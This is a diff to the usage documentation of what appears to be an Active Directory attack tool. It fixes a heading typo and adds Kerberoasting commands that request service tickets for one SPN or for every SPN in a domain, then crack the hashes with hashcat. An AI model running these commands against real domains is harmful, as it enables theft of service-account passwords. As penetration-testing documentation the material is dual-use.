@@ -105,10 +105,15 @@ savoir kerberos asreproast --dc-ip <DOMAIN_IP> -d <DOMAIN> --ldap-user <LDAP_USE
 ```
 
 
-#### Kerberoasing
+#### Kerberoasting
 
 ```bash
-savoir kerberos asktgs --dc-ip <DOMAIN_IP> -d <DOMAIN> -u <USERNAME> -p <USER_PASSWORD> -e rc4 -r <TARGET_USER>
+# target a specific SPN
+savoir kerberos asktgs --dc-ip <DOMAIN_IP> -d <DOMAIN> -u <USERNAME> -p <USER_PASSWORD> --spn <SPN> --output <HASHES>
+# target all SPN in the domain (use the same credentials to query LDAP or use an other account)
+savoir kerberos asktgs --dc-ip <DOMAIN_IP> -d <DOMAIN> -u <USERNAME> -p <USER_PASSWORD> --ldap --output <HASHES>
+# Recover the password
+hashcat -m 13100 -a 0 <HASHES> <PASSWORDS>
 ```
 
 
